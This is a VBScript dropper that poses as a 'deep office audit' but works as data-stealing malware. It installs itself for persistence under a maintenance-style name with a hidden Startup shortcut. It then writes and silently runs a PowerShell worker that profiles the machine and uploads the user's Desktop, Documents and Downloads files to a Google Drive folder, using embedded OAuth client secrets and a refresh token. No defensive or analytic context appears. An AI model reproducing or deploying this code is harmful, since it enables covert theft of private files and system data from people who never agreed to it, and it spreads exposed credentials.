Option Explicit

' --- 1. DECLARATIONS (Prevents "Variable Undefined" Errors) ---
Dim objFSO, objShell, objFile, objShortcut, currentScript
Dim strPSPath, strWorkerName, appDataPath, startupPath
Dim strCID, strSEC, strTOK, strBaseID

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' --- 2. CONFIG & PATHS ---
currentScript = WScript.ScriptFullName
strWorkerName = "deep_audit_v25.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' --- 3. PERSISTENCE BLOCK ---
On Error Resume Next
objShell.Run "powershell.exe -Command ""Unblock-File -Path '" & currentScript & "'""", 0, True
If Not objFSO.FileExists(appDataPath) Then objFSO.CopyFile currentScript, appDataPath, True
If Not objFSO.FileExists(startupPath) Then
    Set objShortcut = objShell.CreateShortcut(startupPath)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & appDataPath & """"
    objShortcut.WindowStyle = 0
    objShortcut.Save
End If
On Error GoTo 0

' --- 4. GOOGLE API KEYS ---
strCID = "677717926428-smega8knnqbrrvo6j4ctvllque8jmc2a.apps.googleusercontent.com"
strSEC = "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"
strTOK = "1//04ovknb57Ph3DCgYIARAAGAQSNwF-L9IrkTy0E_E3b8AIEQ-_jTTy3-o2BDaXitQhY95eLbtN6RM85rDIaOAqckKBZHntlbT09Io"
strBaseID = "1YVAYlF68yQfbD5nyuEUqb1AesoLVV5Ff"

' --- 5. WRITE POWERSHELL WORKER ---
Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '" & strCID & "'; $SEC = '" & strSEC & "'; $TOK = '" & strTOK & "'; $BaseID = '" & strBaseID & "'"

' Auth & Drive Logic
objFile.WriteLine "try { $a=Invoke-RestMethod -Uri 'https://accounts.google.com/o/oauth2/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "$global:h=@{Authorization=""Bearer $($a.access_token)""} } catch { exit }"
objFile.WriteLine "$q = [Uri]::EscapeDataString(""'$BaseID' in parents and trashed = false"")"
objFile.WriteLine "try { $df = (Invoke-RestMethod -Uri ""https://www.googleapis.com/drive/v3/files?q=$q&fields=files(name)"" -Headers $h).files.name"
objFile.WriteLine "$Pause = $false; foreach ($f in $df) { if ($f -ilike '*STOP*' -and ($f -ieq 'STOP' -or $f -ilike ""*STOP-$($env:COMPUTERNAME)*"")) { $Pause = $true } } } catch { $Pause = $false }"

' Folder & Upload Helper
objFile.WriteLine "$meta = @{name=""$($env:COMPUTERNAME)-Audit-$(Get-Date -f 'MMdd-HHmm')"";mimeType='application/vnd.google-apps.folder';parents=@($BaseID)}|ConvertTo-Json"
objFile.WriteLine "$SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body $meta -ContentType 'application/json').id"
objFile.WriteLine "function Up($n, $p, $t) { try { $b=[System.IO.File]::ReadAllBytes($p); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null } catch {} }"

' --- YOUR REQUESTED DEEP REPORT ENGINE ---
objFile.WriteLine "$R = New-Object System.Text.StringBuilder"
objFile.WriteLine "$R.AppendLine('====================================================')"
objFile.WriteLine "$R.AppendLine("" DEEP OFFICE AUDIT: $($env:COMPUTERNAME) "")"
objFile.WriteLine "$R.AppendLine("" TIME: $(Get-Date) "")"
objFile.WriteLine "$R.AppendLine('====================================================`n')"

' Extended Forensics (OS, Bios, Motherboard)
objFile.WriteLine "$os = Get-WmiObject Win32_OperatingSystem; $R.AppendLine('[0. SYSTEM IDENTIFICATION]'); $R.AppendLine(""OS: $($os.Caption)""); $R.AppendLine(""Serial: $((Get-WmiObject Win32_Bios).SerialNumber)""); $R.AppendLine(""MB: $((Get-WmiObject Win32_BaseBoard).Product)""); $R.AppendLine()"

' Profiles, Network, Storage, and Hardware
objFile.WriteLine "$R.AppendLine('[1. USER PROFILES]'); $R.AppendLine(""Profiles found: $((Get-ChildItem 'C:\Users' | Select Name) -join ', ')""); $R.AppendLine()"
objFile.WriteLine "$R.AppendLine('[2. NETWORK DETAILS]'); Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "Get-NetAdapter | Select Name, Status, MacAddress | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "$R.AppendLine('[3. STORAGE DETAILS]'); Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{N='Total_GB';E={[math]::Round($_.Size/1GB,2)}}, @{N='Free_GB';E={[math]::Round($_.FreeSpace/1GB,2)}} | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "$R.AppendLine('[4. HARDWARE INVENTORY]'); Get-PnpDevice | Where-Object {$_.Status -eq 'OK'} | Select Class, FriendlyName, Manufacturer | Out-String | %{$R.AppendLine($_)}"

' Software Inventory (Final Section)
objFile.WriteLine "$R.AppendLine('`n[5. INSTALLED SOFTWARE]'); Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Where {$_.DisplayName -ne $null} | Select DisplayName, DisplayVersion | Sort DisplayName | Out-String | %{$R.AppendLine($_)}"

' Save and Upload Deep Report
objFile.WriteLine "$rt=""$env:TEMP\DeepReport.txt""; $R.ToString() | Out-File $rt; Up 'Deep_Report.txt' $rt $SID; rm $rt"

' --- FILE UPLOAD ENGINE ---
objFile.WriteLine "if (-not $Pause) {"
objFile.WriteLine "  $reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'; $pts = @((gp $reg).Desktop, (gp $reg).Personal, (gp $reg).'{374DE290-123F-4565-9164-39C4925E467B}')"
objFile.WriteLine "  foreach($p in ($pts | select -Unique)){ if(Test-Path $p){ gci $p -File -Recurse -EA 0 | ?{$_.Length -lt 25MB} | %{ Up $_.Name $_.FullName $SID } } }"
objFile.WriteLine "} else { $st=""$env:TEMP\p.txt""; 'Audit Paused' | Out-File $st; Up 'STOPPED.txt' $st $SID; rm $st }"
objFile.Close

' --- 6. EXECUTION ---
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, True
